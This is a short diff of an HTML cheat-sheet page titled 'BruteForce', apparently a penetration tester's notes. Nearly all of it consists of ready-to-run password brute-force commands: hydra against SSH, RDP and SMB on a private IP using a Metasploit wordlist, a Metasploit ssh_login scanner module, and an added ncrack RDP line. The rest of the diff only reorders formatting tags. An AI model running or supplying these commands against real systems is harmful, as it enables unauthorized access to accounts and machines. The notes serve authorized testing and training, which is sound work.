@@ -4,18 +4,19 @@
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>BruteForce</title>
 </head><body><br/>
-<u><span style="font-size: 14pt">SSH Brute Force </span></u><br/>
+<span style="font-size: 14pt"><u>SSH Brute Force </u></span><br/>
 hydra -l root &nbsp;-P /usr/share/wordlists/metasploit/unix_passwords.txt -f &nbsp;192.168.1.38 ssh -V<br/>
 <br/>
 <span style="font-size: 11pt">auxiliary/scanner/ssh/ssh_login</span><br/>
 <br/>
 <img src="image.png" /><br/>
 <br/>
-<span style="font-size: 14pt"><u>RDP Brute Force </u></span><br/>
+<u><span style="font-size: 14pt">RDP Brute Force </span></u><br/>
 <br/>
 hydra -l root &nbsp;-P /usr/share/wordlists/metasploit/unix_passwords.txt -f &nbsp;192.168.1.38 rdp -V<br/>
+ncrack -vv --user offsec -P passwords rdp://10.10.10.10 <br/>
 <br/>
-<u><span style="font-size: 14pt">SMB Brute Force </span></u><br/>
+<span style="font-size: 14pt"><u>SMB Brute Force </u></span><br/>
 <br/>
 hydra -l root &nbsp;-P /usr/share/wordlists/metasploit/unix_passwords.txt -f &nbsp;192.168.1.38 smb -V<br/>
 <br/>
